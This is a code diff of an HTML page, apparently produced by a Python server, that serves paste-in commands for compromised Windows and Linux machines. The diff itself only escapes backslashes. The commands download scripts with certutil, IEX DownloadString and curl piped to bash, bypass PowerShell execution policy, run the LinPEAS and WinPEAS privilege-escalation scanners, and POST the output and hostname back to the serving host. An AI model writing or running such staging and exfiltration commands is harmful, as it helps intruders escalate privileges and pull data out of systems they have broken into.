@@ -137,8 +137,8 @@ powershell -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).Downl
         
         <p><strong>🪟 Windows - Alternative (2-step for problematic shells):</strong></p>
         <code style="background: #000; padding: 10px; display: block; margin: 10px 0;">
-certutil -urlcache -f http://{request.host}/get-script.ps1 %TEMP%\w.ps1<br>
-powershell -ExecutionPolicy Bypass -File %TEMP%\w.ps1
+certutil -urlcache -f http://{request.host}/get-script.ps1 %TEMP%\\w.ps1<br>
+powershell -ExecutionPolicy Bypass -File %TEMP%\\w.ps1
         </code>
         
         <hr>
@@ -151,7 +151,7 @@ curl http://{request.host}/get-linpeas | bash | curl -X POST --data-binary @- -H
         
         <p><strong>Windows (manual):</strong></p>
         <code style="background: #000; padding: 10px; display: block; margin: 10px 0;">
-$r=Invoke-RestMethod http://{request.host}/get-winpeas -OutFile $env:TEMP\w.exe; & $env:TEMP\w.exe | Out-File $env:TEMP\o.txt; Invoke-RestMethod http://{request.host}/upload -Method POST -InFile $env:TEMP\o.txt -Headers @{{"X-Hostname"=$env:COMPUTERNAME}}
+$r=Invoke-RestMethod http://{request.host}/get-winpeas -OutFile $env:TEMP\\w.exe; & $env:TEMP\\w.exe | Out-File $env:TEMP\\o.txt; Invoke-RestMethod http://{request.host}/upload -Method POST -InFile $env:TEMP\\o.txt -Headers @{{"X-Hostname"=$env:COMPUTERNAME}}
         </code>
     </body>
     </html>
